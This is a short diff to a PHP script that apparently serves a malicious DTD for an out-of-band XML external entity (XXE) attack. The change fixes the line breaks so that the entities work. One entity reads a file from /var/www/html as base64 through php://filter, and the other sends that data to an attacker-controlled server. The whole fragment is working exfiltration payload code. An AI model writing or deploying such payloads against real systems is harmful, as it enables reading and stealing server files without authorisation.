@@ -11,9 +11,7 @@
   urlencode($file_name) . "___data=";
   header('Content-Type: text/xml');
   echo <<<XML
-  <!ENTITY % resource SYSTEM 'php://filter/read=convert.base64-encode/
-  resource=file:///var/www/html/$file_name'>
-  <!ENTITY % LoadOOBEnt '<!ENTITY &#x25; OOB SYSTEM
-  "$attacker_server%resource;">'>
+  <!ENTITY % resource SYSTEM 'php://filter/read=convert.base64-encode/resource=file:///var/www/html/$file_name'>
+  <!ENTITY % LoadOOBEnt '<!ENTITY &#x25; OOB SYSTEM "$attacker_server%resource;">'>
   XML;
 ?>
